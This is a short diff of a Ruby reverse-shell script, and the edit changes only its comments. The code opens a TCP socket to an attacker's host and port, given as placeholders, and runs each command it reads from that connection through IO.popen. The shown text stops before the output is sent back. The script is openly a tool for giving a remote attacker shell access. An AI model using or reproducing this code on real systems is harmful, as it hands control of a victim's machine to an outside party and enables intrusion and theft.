@@ -1,9 +1,9 @@
 require "socket"
 
-# Open a new socket and connect to the attacker
+# Open a new TCP socket and connect to the attacker
 sock = TCPSocket.new("*\host*", *\port*)
 
-# Loop to continuously read commands and send back output
+# Read commands from socket until connection is closed
 while cmd = sock.gets
   # Run the received command and capture output
   IO.popen(cmd, "r") do |io|
